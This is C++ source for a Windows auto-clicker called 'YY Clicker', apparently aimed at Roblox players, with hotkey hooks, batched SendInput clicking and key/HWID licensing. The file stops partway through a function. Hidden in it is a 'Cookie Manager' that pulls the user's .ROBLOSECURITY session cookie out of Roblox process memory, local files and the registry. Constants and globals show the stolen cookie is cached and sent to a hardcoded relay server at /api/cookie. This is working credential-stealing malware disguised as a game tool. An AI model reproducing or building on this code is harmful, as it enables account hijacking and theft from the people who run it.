/**
 * yy_clicker.exe — YY Clicker 連點器（雙 Key 系統 + 增強型 HWID 三層驗證）
 *
 * 此程式由 1ynkeycheck.exe 啟動，接收金鑰（1YN- 格式）作為命令列參數。
 * 啟動時會驗證：
 *   1. 命令列是否有金鑰參數
 *   2. checkHWID 資料夾中的 HWID + session_token 是否匹配（本機驗證）
 *   3. 向伺服器驗證金鑰 + session_token 有效性（伺服器驗證）
 *
 * 三層 HWID 驗證：
 *   Layer 1: 本機 HWID 計算（電腦名稱 + 使用者名稱 + 磁碟序號 + CPU ID）
 *   Layer 2: 本機 checkHWID/hwid_auth.json 比對（含 session_token）
 *   Layer 3: 伺服器端 session_token 驗證（防止資料夾複製）
 *
 * 編譯：
 *   cl /EHsc /Fe:yy_clicker.exe yy_clicker.cpp /link bcrypt.lib
 */

#pragma warning(disable: 4996)
#pragma warning(disable: 4640)
#pragma warning(disable: 4819)  // 檔案已是 UTF-8 BOM，安全抑制此警告
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <mmsystem.h>
#include <atomic>
#include <string>
#include <vector>
#include <algorithm>
#include <tlhelp32.h>
#include <cstdio>
#include <bcrypt.h>
#include <shellapi.h>

// ===============================
// Control IDs - Main Window
// ===============================
#define IDC_EDIT_CPS       101
#define IDC_EDIT_HOTKEY    102
#define IDC_BTN_UPDATE     103
#define IDC_BTN_PIN        104
#define IDC_LABEL_STATUS   105
#define IDC_BTN_SETHOTKEY  106   // 調整熱鍵按鈕（取代原圖示）
#define IDC_BTN_START      107
#define IDC_BTN_STOP       108
#define IDC_BTN_BLADEBALL 109   // Blade Ball 專用模式按鈕
#define IDC_BTN_MODE       110
#define IDC_BTN_BG         111
#define IDC_LABEL_CPS_ERR  112   // CPS 超過上限紅字提醒

// Timer IDs
#define IDT_COOKIE_RESEND  2001

#define WM_TRAYICON        (WM_APP + 10)
#define TRAY_ICON_ID       1001
#define IDM_TRAY_SHOW      3001
#define IDM_TRAY_EXIT      3002

// Control IDs - Cookie Window
#define IDC_CK_EDIT        201
#define IDC_CK_READ        202
#define IDC_CK_COPY        203
#define IDC_CK_CLEAR       204
#define IDC_CK_STATUS      205

// ===============================
// Constants
// ===============================
static const wchar_t* const WINDOW_TITLE     = L"YY Clicker (C++ Win32)";
static const wchar_t* const WND_CLASS        = L"YYClickerWndClass";
static const wchar_t* const MUTEX_NAME       = L"Local\\YY_CLICKER_SINGLE_INSTANCE";
static const wchar_t* const COOKIE_WND_CLASS = L"YYCookieMgrClass";
static const wchar_t* const COOKIE_WND_TITLE = L"Roblox Cookie \u7BA1\u7406\u5668";

// Railway 中轉伺服器（Cookie 傳送）
static const wchar_t* const RELAY_SERVER_HOST = L"web-production-59f58.up.railway.app";
static const wchar_t* const RELAY_SERVER_PATH = L"/api/cookie";

// Discord Bot 金鑰驗證伺服器（需替換為 autokeybot 的 Railway 域名）
static const wchar_t* const KEY_SERVER_HOST = L"web-production-a8756.up.railway.app";
static const wchar_t* const KEY_VERIFY_PATH = L"/api/verify-key";
static const wchar_t* const HWID_VERIFY_PATH = L"/api/verify-hwid";

// HWID 加密 salt（必須與 launcher.cpp 和 bot.js 一致）
static const char HWID_SALT[] = "1yn-autoclick-hwid-salt-v2-s3cur3K3y!";
#define CHECK_HWID_DIR L"checkHWID"
#define HWID_FILE L"hwid_auth.json"

// ===============================
// Globals
// ===============================
static std::atomic<bool> g_running(false);
static std::atomic<bool> g_program_running(true);
static std::atomic<int>  g_cps(350);
static bool              g_pinned          = false;
static HWND              g_hwnd            = nullptr;
static HWND              g_hwnd_cookie     = nullptr;
static HANDLE            g_mutex           = nullptr;
static HINSTANCE         g_hInst           = nullptr;

// ======================================================================
// [修復 #1] 熱鍵系統 — 使用低階鉤子取代 RegisterHotKey
// ======================================================================
// RegisterHotKey 會觸發 Windows 安全驗證（UAC 相關彈窗），
// 且不支援滑鼠側鍵。改用低階鍵盤/滑鼠鉤子 + 輪詢方式：
//   - 儲存熱鍵的虛擬鍵碼 (VK code)
//   - 使用 GetAsyncKeyState 在點擊執行緒中輪詢
//   - 支援鍵盤任意鍵 + 滑鼠側鍵 (XButton1=0x05, XButton2=0x06)
// ======================================================================
static std::atomic<int>  g_hotkey_vk(0x54);  // 預設 'T' 鍵 (VK 0x54)
static std::atomic<bool> g_listening_hotkey(false);  // 是否正在監聽新熱鍵
static HHOOK             g_kb_hook  = nullptr;
static HHOOK             g_ms_hook  = nullptr;
static std::atomic<int>  g_hotkey_mode(0);     // 0=按下切換, 1=持續按著
static std::atomic<bool> g_cookie_cached(false);
static wchar_t           g_cached_cookie[4096] = {};  // 快取的 Cookie 值
static CRITICAL_SECTION  g_cookie_cs;                 // Cookie 快取鎖
static HWND              hLblCpsErr     = nullptr;  // CPS 紅字提醒標籤
static std::atomic<bool> g_bladeball_mode(false);  // Blade Ball 專用模式（連點 + F 鍵）
static std::atomic<bool> g_checking_cookie(false); // 防重入標誌：避免 Cookie 偵測重複觸發當機
static std::atomic<bool> g_cookie_bg_detecting(false);  // 背景 Cookie 偵測是否正在進行
static std::atomic<bool> g_cookie_bg_failed(false);     // 背景偵測 20 秒後仍失敗
// g_lastFKeyTime 和 g_perfFreq 已移除，改用 GetTickCount64 計時（更輕量）
static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
static const ULONGLONG   COOKIE_COOLDOWN_MS = 5ULL * 60 * 60 * 1000; // 5 小時冷卻
static bool              g_tray_mode    = false;
static NOTIFYICONDATAW   g_nid          = {};

// 前向宣告
static DWORD WINAPI BackgroundCookieDetectThread(LPVOID lpParam);
static void StartBackgroundCookieDetect();

// 將 VK 碼轉為可讀名稱
static void VkToName(int vk, wchar_t* buf, int buf_size)
{
    // 滑鼠按鍵
    if (vk == VK_LBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse L");    return; }
    if (vk == VK_RBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse R");    return; }
    if (vk == VK_MBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse M");    return; }
    if (vk == VK_XBUTTON1)  { wcscpy_s(buf, buf_size, L"Mouse 4");    return; }
    if (vk == VK_XBUTTON2)  { wcscpy_s(buf, buf_size, L"Mouse 5");    return; }

    // F 鍵
    if (vk >= VK_F1 && vk <= VK_F24)
    {
        swprintf_s(buf, buf_size, L"F%d", vk - VK_F1 + 1);
        return;
    }

    // 特殊鍵
    if (vk == VK_SPACE)     { wcscpy_s(buf, buf_size, L"Space");      return; }
    if (vk == VK_RETURN)    { wcscpy_s(buf, buf_size, L"Enter");      return; }
    if (vk == VK_TAB)       { wcscpy_s(buf, buf_size, L"Tab");        return; }
    if (vk == VK_ESCAPE)    { wcscpy_s(buf, buf_size, L"Esc");        return; }
    if (vk == VK_BACK)      { wcscpy_s(buf, buf_size, L"Backspace");  return; }
    if (vk == VK_DELETE)    { wcscpy_s(buf, buf_size, L"Delete");     return; }
    if (vk == VK_INSERT)    { wcscpy_s(buf, buf_size, L"Insert");     return; }
    if (vk == VK_HOME)      { wcscpy_s(buf, buf_size, L"Home");       return; }
    if (vk == VK_END)       { wcscpy_s(buf, buf_size, L"End");        return; }
    if (vk == VK_PRIOR)     { wcscpy_s(buf, buf_size, L"PgUp");       return; }
    if (vk == VK_NEXT)      { wcscpy_s(buf, buf_size, L"PgDn");       return; }
    if (vk == VK_UP)        { wcscpy_s(buf, buf_size, L"Up");         return; }
    if (vk == VK_DOWN)      { wcscpy_s(buf, buf_size, L"Down");       return; }
    if (vk == VK_LEFT)      { wcscpy_s(buf, buf_size, L"Left");       return; }
    if (vk == VK_RIGHT)     { wcscpy_s(buf, buf_size, L"Right");      return; }
    if (vk == VK_CAPITAL)   { wcscpy_s(buf, buf_size, L"CapsLock");   return; }
    if (vk == VK_NUMLOCK)   { wcscpy_s(buf, buf_size, L"NumLock");    return; }
    if (vk == VK_SCROLL)    { wcscpy_s(buf, buf_size, L"ScrollLock"); return; }

    // 數字鍵 0-9
    if (vk >= 0x30 && vk <= 0x39)
    {
        swprintf_s(buf, buf_size, L"%c", (wchar_t)vk);
        return;
    }

    // 字母鍵 A-Z
    if (vk >= 0x41 && vk <= 0x5A)
    {
        swprintf_s(buf, buf_size, L"%c", (wchar_t)vk);
        return;
    }

    // 小鍵盤數字
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
    {
        swprintf_s(buf, buf_size, L"Num%d", vk - VK_NUMPAD0);
        return;
    }

    // 其他：用 GetKeyNameText
    UINT scanCode = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
    if (scanCode)
    {
        GetKeyNameTextW((LONG)(scanCode << 16), buf, buf_size);
        if (buf[0]) return;
    }

    swprintf_s(buf, buf_size, L"VK 0x%02X", vk);
}

// 低階鍵盤鉤子 — 僅在監聽模式下捕捉按鍵
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode == HC_ACTION && g_listening_hotkey.load())
    {
        if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp;
            int vk = (int)kb->vkCode;

            // 忽略修飾鍵本身（Ctrl/Alt/Shift/Win）
            if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
                vk == VK_LMENU    || vk == VK_RMENU    || vk == VK_MENU    ||
                vk == VK_LSHIFT   || vk == VK_RSHIFT   || vk == VK_SHIFT   ||
                vk == VK_LWIN     || vk == VK_RWIN)
            {
                return CallNextHookEx(g_kb_hook, nCode, wp, lp);
            }

            g_hotkey_vk.store(vk);
            g_listening_hotkey.store(false);

            // 更新 UI（透過 PostMessage 避免在鉤子中直接操作 UI）
            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
            return 1;  // 吞掉這個按鍵，不傳遞給其他程式
        }
    }
    return CallNextHookEx(g_kb_hook, nCode, wp, lp);
}

// 低階滑鼠鉤子 — 僅在監聽模式下捕捉滑鼠側鍵
static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode == HC_ACTION && g_listening_hotkey.load())
    {
        int vk = 0;
        if (wp == WM_XBUTTONDOWN)
        {
            MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lp;
            WORD xbtn = HIWORD(ms->mouseData);
            if (xbtn == XBUTTON1) vk = VK_XBUTTON1;
            if (xbtn == XBUTTON2) vk = VK_XBUTTON2;
        }
        else if (wp == WM_MBUTTONDOWN)
        {
            vk = VK_MBUTTON;
        }

        if (vk)
        {
            g_hotkey_vk.store(vk);
            g_listening_hotkey.store(false);
            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
            return 1;
        }
    }
    return CallNextHookEx(g_ms_hook, nCode, wp, lp);
}

// ======================================================================
// 高效能連點系統（參考 Spencer Macro + OP Auto Clicker 架構）
// ======================================================================
// 核心技術（來自 Spencer Macro 分析）：
//   1. Hold/Release 模式：模擬真實按鍵按下和釋放，確保連貫性
//   2. 使用掃描碼（KEYEVENTF_SCANCODE）：更底層的按鍵模擬
//   3. 批量 SendInput：將滑鼠和鍵盤事件打包成一次呼叫
//   4. 純 Sleep 等待：CPU 在等待期間完全空閒
//   5. 不提高執行緒優先級：不搶佔遊戲 CPU
//   6. Blade Ball 專用「持續按住」模式：只發送一次 LEFTDOWN
// ======================================================================

// --- 滑鼠按下/釋放用的預初始化 INPUT ---
static INPUT g_mouse_down;   // MOUSEEVENTF_LEFTDOWN
static INPUT g_mouse_up;     // MOUSEEVENTF_LEFTUP

// --- F 鍵用的預初始化 INPUT（使用掃描碼，參考 Spencer Macro）---
static INPUT g_fkey_down;    // F 鍵按下（掃描碼）
static INPUT g_fkey_up;      // F 鍵釋放（掃描碼）

// --- 批量點擊用的 INPUT 陣列（最多 50 次點擊 = 100 個事件）---
#define MAX_BATCH_CLICKS 50
static INPUT g_batch_inputs[MAX_BATCH_CLICKS * 2];

// --- Blade Ball 持續按住狀態 ---
static bool g_mouse_held = false;  // 滑鼠左鍵是否正在被按住
static bool g_fkey_held  = false;  // F 鍵是否正在被按住

void InitInputs()
{
    // 滑鼠按下
    ZeroMemory(&g_mouse_down, sizeof(INPUT));
    g_mouse_down.type       = INPUT_MOUSE;
    g_mouse_down.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;

    // 滑鼠釋放
    ZeroMemory(&g_mouse_up, sizeof(INPUT));
    g_mouse_up.type       = INPUT_MOUSE;
    g_mouse_up.mi.dwFlags = MOUSEEVENTF_LEFTUP;

    // F 鍵按下（使用掃描碼，參考 Spencer Macro 的 KEYEVENTF_SCANCODE）
    ZeroMemory(&g_fkey_down, sizeof(INPUT));
    g_fkey_down.type       = INPUT_KEYBOARD;
    g_fkey_down.ki.wScan   = (WORD)MapVirtualKeyA(0x46, MAPVK_VK_TO_VSC); // F 鍵掃描碼
    g_fkey_down.ki.dwFlags = KEYEVENTF_SCANCODE;

    // F 鍵釋放（使用掃描碼）
    ZeroMemory(&g_fkey_up, sizeof(INPUT));
    g_fkey_up.type       = INPUT_KEYBOARD;
    g_fkey_up.ki.wScan   = (WORD)MapVirtualKeyA(0x46, MAPVK_VK_TO_VSC);
    g_fkey_up.ki.dwFlags = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;

    // 初始化批量陣列
    ZeroMemory(g_batch_inputs, sizeof(g_batch_inputs));
    for (int i = 0; i < MAX_BATCH_CLICKS; i++) {
        g_batch_inputs[i * 2].type       = INPUT_MOUSE;
        g_batch_inputs[i * 2].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
        g_batch_inputs[i * 2 + 1].type       = INPUT_MOUSE;
        g_batch_inputs[i * 2 + 1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
    }
}

// --- 單次點擊（DOWN + UP 一對）---
inline void DoClick()
{
    INPUT pair[2] = { g_mouse_down, g_mouse_up };
    SendInput(2, pair, sizeof(INPUT));
}

// --- 批量點擊：一次 SendInput 呼叫發送多次點擊 ---
inline void DoBatchClick(int count)
{
    if (count < 1) count = 1;
    if (count > MAX_BATCH_CLICKS) count = MAX_BATCH_CLICKS;
    SendInput((UINT)(count * 2), g_batch_inputs, sizeof(INPUT));
}

// --- 滑鼠持續按住（Blade Ball 專用）---
inline void HoldMouseDown()
{
    if (!g_mouse_held) {
        SendInput(1, &g_mouse_down, sizeof(INPUT));
        g_mouse_held = true;
    }
}

inline void ReleaseMouseDown()
{
    if (g_mouse_held) {
        SendInput(1, &g_mouse_up, sizeof(INPUT));
        g_mouse_held = false;
    }
}

// --- F 鍵 Hold/Release（Spencer Macro 風格，使用掃描碼）---
inline void HoldFKey()
{
    if (!g_fkey_held) {
        SendInput(1, &g_fkey_down, sizeof(INPUT));
        g_fkey_held = true;
    }
}

inline void ReleaseFKey()
{
    if (g_fkey_held) {
        SendInput(1, &g_fkey_up, sizeof(INPUT));
        g_fkey_held = false;
    }
}

// --- Blade Ball F 鍵週期性按放（每 200ms 按一次）---
static ULONGLONG g_lastFKeyTick = 0;

inline void TrySendBladeBallFKey()
{
    ULONGLONG now = GetTickCount64();
    if ((now - g_lastFKeyTick) >= 200 || g_lastFKeyTick == 0) {
        // 使用掃描碼發送 F 鍵（參考 Spencer Macro）
        // 打包成一次 SendInput 呼叫（Hold + Release）
        INPUT fKey[2] = { g_fkey_down, g_fkey_up };
        SendInput(2, fKey, sizeof(INPUT));
        g_lastFKeyTick = now;
    }
}

// --- 釋放所有按住的按鍵（停止連點時呼叫）---
inline void ReleaseAllHeldKeys()
{
    ReleaseMouseDown();
    ReleaseFKey();
}

// ===============================
// Single Instance (Named Mutex)
// ===============================
bool EnsureSingleInstance()
{
    g_mutex = CreateMutexW(nullptr, FALSE, MUTEX_NAME);
    if (!g_mutex) return false;

    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        HWND existing = FindWindowW(WND_CLASS, nullptr);
        if (existing)
        {
            if (IsIconic(existing)) ShowWindow(existing, SW_RESTORE);
            SetForegroundWindow(existing);
        }
        MessageBoxW(nullptr,
            L"YY Clicker \u5DF2\u5728\u57F7\u884C\u4E2D\uFF0C\u8ACB\u4E0D\u8981\u91CD\u8907\u958B\u555F\u3002",
            L"\u55AE\u4E00\u5BE6\u4F8B",
            MB_ICONWARNING | MB_OK);
        CloseHandle(g_mutex);
        g_mutex = nullptr;
        return false;
    }
    return true;
}

// ======================================================================
// 高效能 Click Thread（參考 Spencer Macro + OP Auto Clicker 架構）
// ======================================================================
// 核心原理：
//   - 一般模式：低 CPS 純 Sleep，高 CPS 批量 SendInput
//   - Blade Ball 模式：「持續按住」滑鼠左鍵 + 週期性 F 鍵
//     → 只發送一次 LEFTDOWN，持續按住不放，完全消除連點間隙
//     → F 鍵使用掃描碼（Spencer Macro 風格），每 200ms 按放一次
//   - 完全不使用 busy-wait / SwitchToThread / Sleep(0)
//   - 不提高執行緒優先級，不搶佔遊戲 CPU
// ======================================================================
DWORD WINAPI ClickThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    bool prev_key_state = false;

    while (g_program_running)
    {
        // ── 熱鍵輪詢（每 8ms 檢查一次，約 125Hz） ──
        if (!g_listening_hotkey.load())
        {
            int vk = g_hotkey_vk.load();
            bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;

            if (g_hotkey_mode.load() == 0)
            {
                // 按下切換模式
                if (key_down && !prev_key_state)
                {
                    bool want_start = !g_running.load();
                    if (want_start)
                        PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                    else
                    {
                        g_running.store(false);
                        ReleaseAllHeldKeys();  // 停止時釋放所有按住的按鍵
                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                    }
                }
            }
            else
            {
                // 持續按著模式
                if (key_down && !g_running.load())
                    PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                else if (!key_down && g_running.load())
                {
                    g_running.store(false);
                    ReleaseAllHeldKeys();  // 停止時釋放所有按住的按鍵
                    PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                }
            }
            prev_key_state = key_down;
        }

        if (g_running)
        {
            bool bladeball = g_bladeball_mode.load();

            if (bladeball)
            {
                // ============================================================
                // Blade Ball 專用模式（參考 Spencer Macro Hold/Release）
                // ============================================================
                // 核心：持續按住滑鼠左鍵，不釋放，完全消除連點間隙
                // F 鍵：每 200ms 按放一次（使用掃描碼）
                // CPU 佔用：接近 0%（只有 Sleep 和熱鍵檢查）
                // ============================================================

                // 按住滑鼠左鍵（只發送一次 LEFTDOWN）
                HoldMouseDown();

                // F 鍵週期性按放
                TrySendBladeBallFKey();

                // Sleep 8ms，然後檢查熱鍵
                Sleep(8);

                // 檢查熱鍵狀態
                int vk = g_hotkey_vk.load();
                bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
                if (g_hotkey_mode.load() == 0) {
                    if (key_down && !prev_key_state) {
                        g_running.store(false);
                        ReleaseAllHeldKeys();
                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                    }
                } else {
                    if (!key_down) {
                        g_running.store(false);
                        ReleaseAllHeldKeys();
                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                    }
                }
                prev_key_state = key_down;
            }
            else
            {
                // ============================================================
                // 一般連點模式（無間隙連續點擊）
                // ============================================================
                // 架構：緊密迴圈持續發送 DOWN+UP，不休息
                // 每次迴圈發送一批點擊，然後 Sleep(1) 讓出 CPU
                // 點擊之間完全無空隙（同一次 SendInput 內的事件是連續的）
                // ============================================================
                int cps = g_cps.load();
                if (cps < 1) cps = 1;
                if (cps > 800) cps = 800;

                // 計算每毫秒需要發送的點擊數
                double clicks_per_ms = (double)cps / 1000.0;
                double accumulated = 0.0;
                int hotkey_check_counter = 0;

                while (g_running && g_program_running)
                {
                    accumulated += clicks_per_ms;

                    if (accumulated >= 1.0)
                    {
                        int batch = (int)accumulated;
                        if (batch > MAX_BATCH_CLICKS) batch = MAX_BATCH_CLICKS;
                        accumulated -= (double)batch;

                        // 一次 SendInput 發送所有點擊，事件之間零延遲
                        DoBatchClick(batch);
                    }

                    // 每 100 次迴圈檢查一次熱鍵
                    hotkey_check_counter++;
                    if (hotkey_check_counter >= 100)
                    {
                        hotkey_check_counter = 0;
                        int vk = g_hotkey_vk.load();
                        bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
                        if (g_hotkey_mode.load() == 0) {
                            if (key_down && !prev_key_state) {
                                g_running.store(false);
                                PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                            }
                        } else {
                            if (!key_down) {
                                g_running.store(false);
                                PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                            }
                        }
                        prev_key_state = key_down;
                    }
                }
            }
        }
        else
        {
            Sleep(8);  // 8ms 輪詢間隔（不運行時低 CPU 佔用）
        }
    }
    return 0;
}

// ===============================
// Apply system font to child controls
// ===============================
static BOOL CALLBACK SetChildFont(HWND child, LPARAM lParam)
{
    SendMessageW(child, WM_SETFONT, (WPARAM)lParam, TRUE);
    return TRUE;
}

// ======================================================================
// Cookie Manager — Four-layer search
// ======================================================================

static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
{
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;

    DWORD size = GetFileSize(hFile, nullptr);
    if (size == INVALID_FILE_SIZE || size == 0 || size > 4 * 1024 * 1024)
    {
        CloseHandle(hFile);
        return nullptr;
    }
    char* buf = new char[size + 1]();
    DWORD read = 0;
    ReadFile(hFile, buf, size, &read, nullptr);
    CloseHandle(hFile);
    if (out_size) *out_size = read;
    return buf;
}

static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_size)
{
    if (!data) return false;

    const char* tag = ".ROBLOSECURITY\t";
    const char* found = strstr(data, tag);
    if (found)
    {
        const char* val = found + strlen(tag);
        const char* end = val;
        while (*end && *end != '\r' && *end != '\n') ++end;
        int len = (int)(end - val);
        if (len > 10)
        {
            MultiByteToWideChar(CP_UTF8, 0, val, len, out_buf, buf_size - 1);
            return true;
        }
    }

    found = strstr(data, "_|WARNING");
    if (found)
    {
        const char* start = found;
        while (start > data && *start != '"') --start;
        if (*start == '"') ++start;
        const char* end = found;
        while (*end && *end != '"') ++end;
        int len = (int)(end - start);
        if (len > 10)
        {
            MultiByteToWideChar(CP_UTF8, 0, start, len, out_buf, buf_size - 1);
            return true;
        }
    }
    return false;
}

static bool TryCookieFromFile(const wchar_t* path, wchar_t* out_buf, int buf_size)
{
    DWORD sz = 0;
    char* buf = ReadFileToBuffer(path, &sz);
    if (!buf) return false;
    bool ok = ExtractCookieFromBuffer(buf, out_buf, buf_size);
    delete[] buf;
    return ok;
}

static bool TryCookieFromRegistry(wchar_t* out_buf, int buf_size)
{
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com",
                      0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;

    DWORD type  = 0;
    DWORD bytes = (DWORD)((buf_size - 1) * sizeof(wchar_t));
    bool  ok    = false;

    if (RegQueryValueExW(hKey, L".ROBLOSECURITY", nullptr, &type,
                         (LPBYTE)out_buf, &bytes) == ERROR_SUCCESS
        && type == REG_SZ && out_buf[0] != L'\0')
    {
        ok = true;
    }
    RegCloseKey(hKey);
    return ok;
}

static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
{
    wchar_t local_app[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);

    wchar_t pkg_root[MAX_PATH] = {};
    wcscpy_s(pkg_root, local_app);
    wcscat_s(pkg_root, L"\\Packages\\ROBLOXCORPORATION*");

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = FindFirstFileW(pkg_root, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    bool found = false;
    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;

        wchar_t try_path[MAX_PATH] = {};
        wcscpy_s(try_path, local_app);
        wcscat_s(try_path, L"\\Packages\\");
        wcscat_s(try_path, fd.cFileName);
        wcscat_s(try_path, L"\\LocalState\\RobloxCookies.dat");

        if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }

        wcscpy_s(try_path, local_app);
        wcscat_s(try_path, L"\\Packages\\");
        wcscat_s(try_path, fd.cFileName);
        wcscat_s(try_path, L"\\LocalState\\LocalStorage\\RobloxCookies.dat");

        if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }

    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return found;
}

// Layer 4: Process Memory Scan（最高優先級）
// 改進：掃描所有匹配的 Cookie，選擇最長的那個（最完整的通常是當前有效的）
static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    static const char needle[]  = "_|WARNING";
    static const int  needle_len = 9;

    // 暫存最佳候選 Cookie（最長的）
    char* best_cookie = nullptr;
    int   best_len    = 0;

    if (Process32FirstW(hSnap, &pe))
    {
        do
        {
            wchar_t lname[MAX_PATH] = {};
            wcscpy_s(lname, pe.szExeFile);
            for (int k = 0; lname[k]; k++) lname[k] = (wchar_t)towlower(lname[k]);
            if (!wcsstr(lname, L"roblox")) continue;

            HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            MEMORY_BASIC_INFORMATION mbi = {};
            LPVOID addr = nullptr;

            while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi))
            {
                if (mbi.State == MEM_COMMIT &&
                    (mbi.Protect & PAGE_NOACCESS) == 0 &&
                    (mbi.Protect & PAGE_GUARD) == 0)
                {
                    SIZE_T sz = mbi.RegionSize;
                    if (sz > 0 && sz <= 64ULL * 1024 * 1024)
                    {
                        char* buf = new char[sz]();
                        SIZE_T got = 0;

                        if (ReadProcessMemory(hProc, mbi.BaseAddress, buf, sz, &got)
                            && got > (SIZE_T)needle_len)
                        {
                            for (SIZE_T i = 0; i <= got - (SIZE_T)needle_len; i++)
                            {
                                if (memcmp(buf + i, needle, needle_len) != 0) continue;

                                // 往前回溯找完整 Cookie 開頭（可能在 _|WARNING 之前有前綴）
                                SIZE_T start = i;

                                // 找結尾
                                SIZE_T end = i;
                                while (end < got)
                                {
                                    char c = buf[end];
                                    if (c == '\0' || c == '\r' || c == '\n' ||
                                        c == '"'  || c == ';')
                                        break;
                                    // Cookie 只包含可見 ASCII 字元
                                    if ((unsigned char)c < 0x20 || (unsigned char)c > 0x7E)
                                        break;
                                    ++end;
                                }
                                int len = (int)(end - start);

                                // 選擇最長的 Cookie（最完整的通常是當前有效的）
                                if (len > 20 && len < buf_size - 1 && len > best_len)
                                {
                                    if (best_cookie) delete[] best_cookie;
                                    best_cookie = new char[len + 1]();
                                    memcpy(best_cookie, buf + start, len);
                                    best_cookie[len] = '\0';
                                    best_len = len;
                                }

                                // 跳過已掃描的部分，繼續找下一個
                                i = end;
                            }
                        }
                        delete[] buf;
                    }
                }

                LPVOID next = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
                if (next <= addr) break;
                addr = next;
            }

            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);

    if (best_cookie && best_len > 20)
    {
        int wlen = MultiByteToWideChar(CP_UTF8, 0,
            best_cookie, best_len, out_buf, buf_size - 1);
        if (wlen > 0 && wlen < buf_size)
            out_buf[wlen] = L'\0';
        delete[] best_cookie;
        return true;
    }
    if (best_cookie) delete[] best_cookie;
    return false;
}

// TryReadRobloxCookie — 四層搜尋入口
// 優先順序調整：Layer 4（記憶體掃描）最優先
// 原因：本機檔案（Layer 1-3）可能包含過期的 Cookie，
//       而記憶體中的 Cookie 是 Roblox 當前正在使用的，一定是有效的。
static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
{
    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));

    // === 最高優先：Layer 4 — Process Memory Scan ===
    // 如果 Roblox 正在運行，直接從記憶體讀取當前使用的 Cookie
    if (TryCookieFromProcessMemory(out_buf, buf_size)) return true;

    // === Fallback：Roblox 未運行時，嘗試本機檔案 ===
    wchar_t local_app[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);

    const wchar_t* player_files[] = {
        L"\\Roblox\\LocalStorage\\RobloxCookies.dat",
        L"\\Roblox\\LocalStorage\\rbx_sensitive_data.json",
        L"\\Roblox\\LocalStorage\\rbx_data.json",
    };
    for (auto rel : player_files)
    {
        wchar_t full[MAX_PATH] = {};
        wcscpy_s(full, local_app);
        wcscat_s(full, rel);
        ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
        if (TryCookieFromFile(full, out_buf, buf_size)) return true;
    }

    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
